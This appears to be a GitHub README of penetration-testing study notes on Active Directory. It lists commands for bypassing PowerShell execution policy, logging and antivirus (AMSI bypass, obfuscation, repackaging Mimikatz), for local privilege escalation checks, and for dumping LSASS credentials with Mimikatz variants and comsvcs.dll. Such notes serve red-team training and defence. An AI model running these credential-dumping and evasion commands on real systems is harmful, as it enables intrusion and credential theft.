
<h1>Active Directory Pentest</h1>

<h2>Components:</h2>

![Capture](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/1039ece9-48a7-4028-903d-831b1a31ee91)

<h2>Detections:</h2>

![Capture_Detections](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/80f90de4-7467-4a32-8fc9-5aa46e8943fb)

<h2>Bypassing Execution Policy:</h2>
	
 	*It is NOT a security measure, it is present to prevent user from 
		accidently executing scripts.
 	*Several ways to bypass
		powershell –ExecutionPolicy bypass
		powershell –c <cmd>   ////Only Commands
		powershell –encodedcommand
		$env:PSExecutionPolicyPreference="bypass"
<h2>Bypassing PowerShell Security:</h2>
	
 	use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell. The tool hooks the .NET assemblies (System.Management.Automation.dll and System.Core.dll) to bypass logging
	
 	It uses a CLR Profiler API to perform the hook. "A common language runtime (CLR) profiler is a dynamic link library (DLL) that consists of functions that receive messages from, and send messages to, the CLR by using the profiling API. The profiler DLL is loaded by the CLR at run time."

<h2>Bypassing AV Signatures for PowerShell:</h2>
	
 	*load scripts in memory and avoid detection using AMSI bypass.
		How do we bypass signature based detection of on-disk PowerShell scripts by Windows Defender?
  			>We can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected. Simply provide path to the script file to scan it:
				AmsiTrigger_x64.exe -i <"Path To The Script for testing it">
	*For full obfuscation of PowerShell scripts:
 		>see Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation).
 ![Example-BypassingAV](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/814cdce0-f2aa-4f65-b56e-8111ea86f84f)
 <h2>Local Privilege Escalation</h2>

	– PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
	– Privesc: https://github.com/enjoiz/Privesc
 		– PowerUp
			Invoke-AllChecks

      			• Get services with unquoted paths and a space in their name.
				Get-ServiceUnquoted -Verbose
			• Get services where the current user can write to its binary path or change arguments to the binary
				Get-ModifiableServiceFile -Verbose
			• Get the services whose configuration current user can modify.
				Get-ModifiableService -Verbose
		– Privesc:
			Invoke-PrivEsc
		– PrivescCheck:
			Invoke-Privesc Check
		– PEASS-ng:
			winPEASx64.exe
   
<h2>Lateral Movement - Extracting Credentials from LSASS</h2>

	• Dump credentials on a local machine using Mimikatz.
		Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 
	• Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
		SafetyKatz.exe "sekurlsa::ekeys" 
	• Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
		SharpKatz.exe --Command ekeys
	• Dump credentials using Dumpert (Direct System Calls and API unhooking)
		rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
	• Using comsvcs.dll
 		tasklist /FI "IMAGENAME eq lsass.exe"
   		rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full


	
<h2>Offensive .NET - Tradecraft - AV bypass</h2>

	• We can use DefenderCheck (https://github.com/matterpreter/DefenderCheck) to identify code and strings from a binary that Windows Defender may flag.

 ![image](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/3cfb9039-d958-48b2-94b2-c008d80b3054)

 <h4>Offensive .NET - Tradecraft - AV bypass -String Manipulation</h4>

	For SafetyKatz, we used the following steps;
		• Download latest version of Mimikatz and Out-CompressedDll.ps1
		• Run the Out-CompressedDll.ps1 PowerShell script on Mimikatz binary and save the output to a file.
			Out-CompressedDll <Path to mimikatz.exe> > outputfilename.txt
 
